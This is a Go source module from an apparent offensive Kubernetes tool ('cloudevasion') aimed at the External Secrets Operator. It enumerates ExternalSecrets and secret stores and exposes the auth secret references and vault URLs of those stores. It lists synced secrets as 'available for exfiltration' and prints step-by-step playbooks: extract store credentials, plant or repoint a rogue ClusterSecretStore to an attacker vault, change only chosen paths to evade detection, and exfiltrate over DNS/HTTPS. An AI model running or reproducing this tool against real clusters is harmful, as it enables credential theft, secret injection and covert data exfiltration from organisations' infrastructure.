package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var externalSecretGVR = schema.GroupVersionResource{
	Group: "external-secrets.io", Version: "v1beta1", Resource: "externalsecrets",
}

var secretStoreGVR = schema.GroupVersionResource{
	Group: "external-secrets.io", Version: "v1beta1", Resource: "secretstores",
}

var clusterSecretStoreGVR = schema.GroupVersionResource{
	Group: "external-secrets.io", Version: "v1beta1", Resource: "clustersecretstores",
}

func detectExternalSecrets(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"external-secrets", "external-secrets-system", "es-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app.kubernetes.io/name=external-secrets",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "external-secrets",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d external-secrets pods", len(pods.Items)),
			}}
		}
	}

	secrets, err := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, s := range secrets.Items {
			if _, ok := s.Labels["reconcile.external-secrets.io/created-by"]; ok {
				return []DetectionSystem{{
					Name:      "external-secrets",
					Detected:  true,
					Namespace: s.Namespace,
					Details:   "synced secrets found (reconcile label)",
				}}
			}
		}
	}

	return nil
}

// ExploitExternalSecrets executes the specified External Secrets Operator exploitation technique.
func ExploitExternalSecrets(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "enumerate":
		return externalSecretsEnumerate(ctx, client, dynClient)
	case "store_exploit":
		return externalSecretsStoreExploit(ctx, client, dynClient)
	case "rogue_store":
		return externalSecretsRogueStore(ctx, dynClient)
	case "secret_exfil":
		return externalSecretsExfil(ctx, client, dynClient)
	default:
		return externalSecretsEnumerate(ctx, client, dynClient)
	}
}

func externalSecretsEnumerate(ctx context.Context, _ kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("External Secrets Operator Enumeration:\n\n")

	found := false

	extSecrets, err := dynClient.Resource(externalSecretGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(extSecrets.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  ExternalSecrets (%d):\n", len(extSecrets.Items))
		for _, es := range extSecrets.Items {
			spec, _ := es.Object["spec"].(map[string]any)
			secretStoreRef, _ := spec["secretStoreRef"].(map[string]any)
			storeName, _ := secretStoreRef["name"].(string)
			storeKind, _ := secretStoreRef["kind"].(string)
			fmt.Fprintf(&sb, "    %s/%s → store=%s (%s)\n", es.GetNamespace(), es.GetName(), storeName, storeKind)
		}
		sb.WriteString("\n")
	}

	stores, err := dynClient.Resource(secretStoreGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(stores.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  SecretStores (%d):\n", len(stores.Items))
		for _, store := range stores.Items {
			spec, _ := store.Object["spec"].(map[string]any)
			provider, _ := spec["provider"].(map[string]any)
			providerType := "unknown"
			for k := range provider {
				providerType = k
				break
			}
			fmt.Fprintf(&sb, "    %s/%s provider=%s\n", store.GetNamespace(), store.GetName(), providerType)
		}
		sb.WriteString("\n")
	}

	clusterStores, err := dynClient.Resource(clusterSecretStoreGVR).List(ctx, metav1.ListOptions{})
	if err == nil && len(clusterStores.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  ClusterSecretStores (%d):\n", len(clusterStores.Items))
		for _, store := range clusterStores.Items {
			spec, _ := store.Object["spec"].(map[string]any)
			provider, _ := spec["provider"].(map[string]any)
			providerType := "unknown"
			for k := range provider {
				providerType = k
				break
			}
			fmt.Fprintf(&sb, "    %s provider=%s\n", store.GetName(), providerType)
		}
	}

	if !found {
		sb.WriteString("  No External Secrets resources detected\n")
	}

	return &EvasionResult{
		Technique: "enumerate",
		Success:   found,
		Output:    sb.String(),
	}, nil
}

func externalSecretsStoreExploit(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("External Secrets Store Credential Exploitation:\n\n")

	sb.WriteString("  SecretStores contain credentials to access external vaults.\n")
	sb.WriteString("  These credentials often have broad read access to all secrets.\n\n")

	stores, err := dynClient.Resource(secretStoreGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list SecretStores: %v\n", err)
		return &EvasionResult{Technique: "store_exploit", Success: false, Output: sb.String()}, nil
	}

	credSecrets := 0
	for _, store := range stores.Items {
		spec, _ := store.Object["spec"].(map[string]any)
		provider, _ := spec["provider"].(map[string]any)

		for provType, provConfig := range provider {
			fmt.Fprintf(&sb, "  Store: %s/%s (provider=%s)\n", store.GetNamespace(), store.GetName(), provType)

			provMap, _ := provConfig.(map[string]any)
			if auth, ok := provMap["auth"].(map[string]any); ok {
				if secretRef, ok := auth["secretRef"].(map[string]any); ok {
					for key, ref := range secretRef {
						if refMap, ok := ref.(map[string]any); ok {
							name, _ := refMap["name"].(string)
							fmt.Fprintf(&sb, "    Auth %s: secret=%s\n", key, name)
							credSecrets++
						}
					}
				}
				if jwt, ok := auth["jwt"].(map[string]any); ok {
					fmt.Fprintf(&sb, "    Auth JWT: %v\n", jwt)
				}
			}

			if server, ok := provMap["server"].(string); ok {
				fmt.Fprintf(&sb, "    Server: %s\n", server)
			}
			if url, ok := provMap["url"].(string); ok {
				fmt.Fprintf(&sb, "    URL: %s\n", url)
			}
		}
		sb.WriteString("\n")
	}

	clusterStores, _ := dynClient.Resource(clusterSecretStoreGVR).List(ctx, metav1.ListOptions{})
	if clusterStores != nil {
		for _, store := range clusterStores.Items {
			spec, _ := store.Object["spec"].(map[string]any)
			provider, _ := spec["provider"].(map[string]any)
			for provType := range provider {
				fmt.Fprintf(&sb, "  ClusterSecretStore: %s (provider=%s)\n", store.GetName(), provType)
			}
		}
	}

	secrets, _ := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
	if secrets != nil {
		for _, s := range secrets.Items {
			if strings.Contains(s.Name, "external-secret") || strings.Contains(s.Name, "vault-token") {
				fmt.Fprintf(&sb, "  Related secret: %s/%s\n", s.Namespace, s.Name)
			}
		}
	}

	sb.WriteString("\n  Store credential exploitation:\n")
	sb.WriteString("    1. Extract SecretStore auth credentials from referenced K8s secrets\n")
	sb.WriteString("    2. Use credentials to access vault directly (bypass ESO scope)\n")
	sb.WriteString("    3. ESO credentials often have broad read access to entire vault\n")
	sb.WriteString("    4. AWS: IAM role/keys with secretsmanager:GetSecretValue on *\n")
	sb.WriteString("    5. Vault: token with broad path permissions for KV reads\n")
	sb.WriteString("    6. GCP: service account with Secret Manager accessor role\n")

	return &EvasionResult{
		Technique: "store_exploit",
		Success:   credSecrets > 0,
		Output:    sb.String(),
	}, nil
}

func externalSecretsRogueStore(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Rogue ClusterSecretStore Creation:\n\n")

	sb.WriteString("  ClusterSecretStores are cluster-scoped — any namespace can reference them.\n")
	sb.WriteString("  Creating a rogue store lets us inject arbitrary secret values.\n\n")

	clusterStores, err := dynClient.Resource(clusterSecretStoreGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list ClusterSecretStores: %v\n", err)
		sb.WriteString("  ESO CRDs may not be installed\n")
		return &EvasionResult{Technique: "rogue_store", Success: false, Output: sb.String()}, nil
	}

	fmt.Fprintf(&sb, "  Existing ClusterSecretStores (%d):\n", len(clusterStores.Items))
	for _, store := range clusterStores.Items {
		fmt.Fprintf(&sb, "    %s\n", store.GetName())
	}

	sb.WriteString("\n  Rogue store attack:\n")
	sb.WriteString("    1. Create ClusterSecretStore pointing to attacker-controlled vault\n")
	sb.WriteString("    2. Create ExternalSecret referencing rogue store in target namespace\n")
	sb.WriteString("    3. ESO syncs attacker's values into target namespace as K8s Secret\n")
	sb.WriteString("    4. Workloads consuming that secret now use attacker-controlled values\n")
	sb.WriteString("    5. Inject malicious config, credentials, or cert material\n\n")

	sb.WriteString("  Variant — modify existing store:\n")
	sb.WriteString("    1. Patch existing ClusterSecretStore provider URL to attacker vault\n")
	sb.WriteString("    2. All ExternalSecrets referencing it now sync from attacker\n")
	sb.WriteString("    3. Subtle: only modify specific paths to avoid detection\n")

	return &EvasionResult{
		Technique: "rogue_store",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func externalSecretsExfil(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("External Secrets Exfiltration:\n\n")

	sb.WriteString("  ESO syncs external secrets into K8s Secrets — they're readable in-cluster.\n\n")

	extSecrets, err := dynClient.Resource(externalSecretGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list ExternalSecrets: %v\n", err)
		return &EvasionResult{Technique: "secret_exfil", Success: false, Output: sb.String()}, nil
	}

	targetSecrets := make(map[string]string)
	for _, es := range extSecrets.Items {
		spec, _ := es.Object["spec"].(map[string]any)
		target, _ := spec["target"].(map[string]any)
		secretName, _ := target["name"].(string)
		if secretName == "" {
			secretName = es.GetName()
		}
		ns := es.GetNamespace()
		targetSecrets[ns+"/"+secretName] = es.GetName()
	}

	fmt.Fprintf(&sb, "  Synced secrets available for exfiltration (%d):\n", len(targetSecrets))
	count := 0
	for secretRef, esName := range targetSecrets {
		count++
		if count <= 20 {
			fmt.Fprintf(&sb, "    %s (from ExternalSecret: %s)\n", secretRef, esName)
		}
	}
	if count > 20 {
		fmt.Fprintf(&sb, "    ... and %d more\n", count-20)
	}

	managedSecrets := 0
	secrets, _ := client.CoreV1().Secrets("").List(ctx, metav1.ListOptions{})
	if secrets != nil {
		for _, s := range secrets.Items {
			if _, ok := s.Labels["reconcile.external-secrets.io/created-by"]; ok {
				managedSecrets++
			}
		}
	}
	fmt.Fprintf(&sb, "\n  ESO-managed K8s Secrets (reconcile label): %d\n", managedSecrets)

	sb.WriteString("\n  Exfiltration approach:\n")
	sb.WriteString("    1. Read synced K8s Secrets directly (standard secret access)\n")
	sb.WriteString("    2. Secrets contain values from Vault/AWS SM/GCP SM/Azure KV\n")
	sb.WriteString("    3. Create new ExternalSecret to sync additional paths from store\n")
	sb.WriteString("    4. If ClusterSecretStore has broad access: sync ANY secret path\n")
	sb.WriteString("    5. Exfil via DNS/HTTPS to extract high-value credentials\n")

	return &EvasionResult{
		Technique: "secret_exfil",
		Success:   len(targetSecrets) > 0,
		Output:    sb.String(),
	}, nil
}
